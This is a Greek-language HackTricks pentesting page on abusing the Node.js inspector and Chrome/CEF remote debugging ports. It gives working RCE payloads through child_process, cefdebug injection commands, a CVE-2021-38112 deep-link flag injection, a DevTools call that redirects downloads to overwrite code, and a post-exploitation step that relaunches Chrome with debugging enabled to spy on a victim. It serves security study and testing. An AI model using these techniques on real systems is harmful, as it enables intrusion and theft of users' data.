# Κατάχρηση του Node inspector/CEF debug

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

[Από τα έγγραφα](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Όταν ξεκινά με τον διακόπτη `--inspect`, ένα διεργασία Node.js ακούει για έναν πελάτη αποσφαλμάτωσης. Από προεπιλογή, θα ακούσει στη διεύθυνση και θύρα **`127.0.0.1:9229`**. Κάθε διεργασία έχει επίσης ανατεθεί ένα **μοναδικό** **UUID**.

Οι πελάτες του Inspector πρέπει να γνωρίζουν και να καθορίζουν τη διεύθυνση του κεντρικού υπολογιστή, τη θύρα και το UUID για να συνδεθούν. Ένας πλήρης URL θα μοιάζει κάπως έτσι `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Εφόσον ο **αποσφαλματωτής έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης του Node.js**, ένας κακόβουλος χρήστης που μπορεί να συνδεθεί σε αυτήν τη θύρα μπορεί να εκτελέσει αυθαίρετο κώδικα εξ ονόματος της διεργασίας Node.js (**πιθανή ανέλιξη προνομιακών δικαιωμάτων**).
{% endhint %}

Υπάρχουν αρκετοί τρόποι για να ξεκινήσετε έναν αποσφαλματωτή:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Όταν ξεκινάτε έναν ελεγχόμενο διεργασία, κάτι τέτοιο θα εμφανιστεί:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Οι διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**) χρειάζεται να χρησιμοποιούν την παράμετρο: `--remote-debugging-port=9222` για να ανοίξουν τον **αποσφαλματωτή** (οι προστασίες SSRF παραμένουν πολύ παρόμοιες). Ωστόσο, αντί να παρέχουν μια συνεδρία **αποσφαλμάτωσης** του **NodeJS**, θα επικοινωνήσουν με τον περιηγητή χρησιμοποιώντας το [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), που είναι μια διεπαφή για τον έλεγχο του περιηγητή, αλλά δεν υπάρχει άμεση ευπάθεια RCE.

Όταν ξεκινάτε έναν αποσφαλματωμένο περιηγητή, κάτι τέτοιο θα εμφανιστεί:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Προγράμματα περιήγησης, WebSockets και πολιτική ίδιας προέλευσης <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε έναν πρόγραμμα περιήγησης μπορούν να κάνουν αιτήσεις WebSocket και HTTP σύμφωνα με το μοντέλο ασφαλείας του προγράμματος περιήγησης. Μια **αρχική σύνδεση HTTP** είναι απαραίτητη για να **λάβετε ένα μοναδικό αναγνωριστικό συνεδρίας του εργαλείου αποσφαλμάτωσης**. Η **πολιτική ίδιας προέλευσης** **αποτρέπει** τους ιστότοπους από το να μπορούν να κάνουν **αυτήν τη σύνδεση HTTP**. Για επιπλέον ασφάλεια ενάντια σε [**επιθέσεις DNS rebinding**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** το Node.js επαληθεύει ότι οι **κεφαλίδες 'Host'** για τη σύνδεση καθορίζουν είτε μια **διεύθυνση IP** είτε το **`localhost`** ή το **`localhost6`** ακριβώς.

{% hint style="info" %}
Αυτά τα **μέτρα ασφαλείας αποτρέπουν την εκμετάλλευση του εργαλείου αποσφαλμάτωσης** για να εκτελέσει κώδικα απλά αποστέλλοντας μια αίτηση HTTP (που θα μπορούσε να γίνει εκμεταλλευόμενη μια ευπάθεια SSRF).
{% endhint %}

### Έναρξη του εργαλείου αποσφαλμάτωσης σε εκτελούμενες διεργασίες

Μπορείτε να στείλετε το **σήμα SIGUSR1** σε μια εκτελούμενη διεργασία nodejs για να την κάνετε να **ξεκινήσει το εργαλείο αποσφαλμάτωσης** στην προεπιλεγμένη θύρα. Ωστόσο, σημειώστε ότι χρειάζεστε επαρκή δικαιώματα, οπότε αυτό μπορεί να σας παράσχει **προνομιούχη πρόσβαση σε πληροφορίες μέσα στη διεργασία** αλλά όχι μια άμεση ανέλιξη προνομιών.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Αυτό είναι χρήσιμο σε containers επειδή **δεν είναι εφικτό** να **τερματίσετε τη διεργασία και να ξεκινήσετε μια νέα** με την παράμετρο `--inspect`, καθώς το **container** θα **τερματιστεί** μαζί με τη διεργασία.
{% endhint %}

### Σύνδεση με τον inspector/debugger

Για να συνδεθείτε σε έναν **περιηγητή βασισμένο σε Chromium**, μπορείτε να αποκτήσετε πρόσβαση στις διευθύνσεις URL `chrome://inspect` ή `edge://inspect` για το Chrome ή το Edge αντίστοιχα. Κάνοντας κλικ στο κουμπί Configure, βεβαιωθείτε ότι οι **στόχοι (host) και θύρες** είναι σωστά καταχωρημένοι. Η εικόνα παρουσιάζει ένα παράδειγμα Remote Code Execution (RCE):

![](<../../.gitbook/assets/image (620) (1).png>)

Χρησιμοποιώντας τη **γραμμή εντολών**, μπορείτε να συνδεθείτε σε έναν debugger/inspector με την εντολή:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), επιτρέπει να **βρεθούν οι επιθεωρητές** που τρέχουν τοπικά και να **εισαχθεί κώδικας** σε αυτούς.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Σημείωση ότι τα εκμεταλλεύματα **NodeJS RCE δεν θα λειτουργήσουν** αν είστε συνδεδεμένοι σε ένα πρόγραμμα περιήγησης μέσω [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (πρέπει να ελέγξετε το API για να βρείτε ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό).
{% endhint %}

## RCE στον επιθετή NodeJS Debugger/Inspector

{% hint style="info" %}
Αν ήρθατε εδώ ψάχνοντας πώς να πάρετε [**RCE από ένα XSS στο Electron, παρακαλούμε ελέγξτε αυτήν τη σελίδα.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Ορισμένοι συνηθισμένοι τρόποι για να αποκτήσετε **RCE** όταν μπορείτε να **συνδεθείτε** σε έναν επιθετή Node είναι να χρησιμοποιήσετε κάτι όπως (φαίνεται ότι αυτό **δεν θα λειτουργήσει σε μια σύνδεση με το Chrome DevTools protocol**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Πληροφορίες Πακέτου Chrome DevTools

Μπορείτε να ελέγξετε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Σε αυτήν την ενότητα θα απαριθμήσω απλώς ενδιαφέρουσες πράξεις που έχουν χρησιμοποιηθεί για να εκμεταλλευτούν αυτό το πρωτόκολλο.

### Έγχυση Παραμέτρων μέσω Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), η Rhino Security ανακάλυψε ότι μια εφαρμογή βασισμένη στο CEF **καταχώρησε ένα προσαρμοσμένο URI** στο σύστημα (workspaces://) που λάμβανε το πλήρες URI και στη συνέχεια **εκκινούσε την εφαρμογή βασισμένη στο CEF** με μια διαμόρφωση που κατασκευάστηκε εν μέρει από αυτό το URI.

Ανακαλύφθηκε ότι οι παράμετροι του URI αποκωδικοποιούνταν και χρησιμοποιούνταν για να εκκινήσουν τη βασική εφαρμογή CEF, επιτρέποντας σε έναν χρήστη να **εισαγάγει** τη σημαία **`--gpu-launcher`** στη **γραμμή εντολών** και να εκτελέσει αυθαίρετες ενέργειες.

Έτσι, ένα πακέτο όπως:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Θα εκτελέσει ένα calc.exe.

### Αντικατάσταση Αρχείων

Αλλάξτε τον φάκελο όπου **θα αποθηκεύονται τα κατεβασμένα αρχεία** και κατεβάστε ένα αρχείο για να **αντικαταστήσετε** το συχνά χρησιμοποιούμενο **πηγαίο κώδικα** της εφαρμογής με τον **κακόβουλο κώδικά** σας.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE και εξαγωγή δεδομένων

Σύμφωνα με αυτήν την ανάρτηση: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) είναι δυνατόν να αποκτηθεί RCE και να εξαχθούν εσωτερικές σελίδες από τον οδηγό.

### Μετά την εκμετάλλευση

Σε ένα πραγματικό περιβάλλον και **μετά την διάβρωση** ενός υπολογιστή χρήστη που χρησιμοποιεί πρόγραμμα περιήγησης βασισμένο σε Chrome/Chromium, μπορείτε να ξεκινήσετε ένα διεργασία Chrome με την **ενεργοποίηση της αποσφαλμάτωσης και την προώθηση της θύρας αποσφαλμάτωσης** έτσι ώστε να έχετε πρόσβαση σε αυτήν. Με αυτόν τον τρόπο θα μπορείτε να **επιθεωρήσετε όλες τις ενέργειες που κάνει ο θύμα με το Chrome και να κλέψετε ευαίσθητες πληροφορίες**.

Ο αόρατος τρόπος είναι να **τερματίσετε κάθε διεργασία Chrome** και στη συνέχεια να καλέσετε κάτι όπως
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Αναφορές

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
